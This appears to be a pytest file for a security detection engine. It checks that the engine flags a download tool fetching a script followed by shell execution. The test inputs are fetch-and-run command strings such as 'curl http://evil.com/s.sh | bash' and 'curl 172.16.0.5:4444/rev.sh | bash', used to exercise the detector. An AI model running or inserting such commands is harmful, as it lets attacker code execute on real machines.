import pytest
from app.detection.engine.correlation_engine import _is_event_a, _extract_url, CorrelationMatch


def test_correlation_match_metadata_sourced_from_yaml():
    """rule_id/name/risk/severity/mitre come from engine_meta YAML, not hardcode."""
    m = CorrelationMatch()
    assert m.rule_id == "linux_t1059_download_then_shell_execution"
    assert m.rule_name == "Network Script Download Followed by Shell Execution"
    assert m.risk_score == 70
    assert m.severity == "high"
    assert m.mitre_tactic == "TA0002"
    assert m.mitre_technique == "T1059.004"


CMD_URL_SHELL = "http://evil.com/s.sh | bash"
CMD_URL_ONLY = "http://evil.com/payload"
CMD_SHELL_ONLY = "| bash"


@pytest.mark.parametrize("tool", ["curl", "wget", "nc", "ncat", "socat", "openssl"])
def test_download_tool_with_url_and_shell_indicator_matches(tool):
    matched, url = _is_event_a(tool, f"{tool} {CMD_URL_SHELL}")
    assert matched is True
    assert url.startswith("http://")


def test_curl_without_url_does_not_match():
    matched, _ = _is_event_a("curl", f"curl {CMD_SHELL_ONLY}")
    assert matched is False


def test_curl_with_url_but_no_shell_indicator_matches():
    # Shell indicators in the URL are no longer required; the two-event pattern
    # (download tool + URL followed by a shell process) is sufficient.
    matched, url = _is_event_a("curl", f"curl {CMD_URL_ONLY}")
    assert matched is True
    assert url.startswith("http://")


def test_non_download_tool_does_not_match():
    matched, _ = _is_event_a("python", f"python {CMD_URL_SHELL}")
    assert matched is False


# ---------------------------------------------------------------------------
# Bare IP URL tests (regression for schemaless curl attack pattern)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("cmd,expected_url", [
    ("curl 192.168.88.157:8080/backdoor.sh", "192.168.88.157:8080/backdoor.sh"),
    ("wget 10.0.0.1/malware.sh", "10.0.0.1/malware.sh"),
    ("curl 172.16.0.5:4444/rev.sh | bash", "172.16.0.5:4444/rev.sh"),
])
def test_curl_with_bare_ip_url_matches(cmd, expected_url):
    """curl/wget with a bare IP:port/path URL (no http:// scheme) must be classified as Event A."""
    tool = cmd.split()[0]
    matched, url = _is_event_a(tool, cmd)
    assert matched is True, f"Expected Event A for: {cmd}"
    assert url == expected_url


def test_curl_with_plain_ip_no_path_does_not_match():
    """A bare IP address without a path component must NOT be classified as Event A."""
    matched, _ = _is_event_a("curl", "curl 192.168.1.1")
    assert matched is False


def test_extract_url_bare_ip_port():
    """_extract_url must extract bare IP:port/path tokens."""
    url = _extract_url("curl 192.168.88.157:8080/backdoor.sh")
    assert url == "192.168.88.157:8080/backdoor.sh"


def test_extract_url_prefers_scheme_over_bare_ip():
    """_extract_url must prefer http:// tokens over bare IPs when both are present."""
    url = _extract_url("curl http://evil.com/s.sh 192.168.1.1/other")
    assert url == "http://evil.com/s.sh"
